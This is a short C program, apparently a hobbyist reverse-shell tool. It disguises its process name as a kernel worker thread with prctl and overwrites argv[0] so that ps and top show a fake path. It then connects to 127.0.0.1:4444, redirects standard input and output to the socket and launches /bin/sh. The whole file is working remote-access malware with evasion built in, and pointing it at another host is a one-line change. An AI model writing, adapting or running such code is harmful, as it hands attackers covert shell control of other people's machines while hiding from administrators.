#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h> 

//will change the kernel task name of the pros=ccess visible in top or ps
// max 15 charachters allowed

int main(int argc, char* argv[]){
    prctl(PR_SET_NAME,"whoami/0:1", 0, 0, 0);


    //overwrite argv[0] so ps shows fake system path

    if( argc > 0 && argv[0]){
        //coy ake name into argv[0]
        snprintf(argv[0], 256, "/WHOAMI");
    }
/** */
    char *target_ip = "127.0.0.1";
    int target_port = 4444;

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        return 1; // bored for error and stuff
    }

    struct sockaddr_in rev_addr;
    rev_addr.sin_family = AF_INET;
    rev_addr.sin_port = htons(target_port);
    rev_addr.sin_addr.s_addr = inet_addr(target_ip);

    if(connect(sock, (struct sockaddr *)&rev_addr, sizeof(rev_addr)) < 0){
        close(sock);
        return 1;//still bored
    }

    dup2(sock,0);
    dup2(sock,1);
    dup2(sock,2);

    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    while(1){
        sleep(1);
        printf("hello\n");
    }

    return 0;




}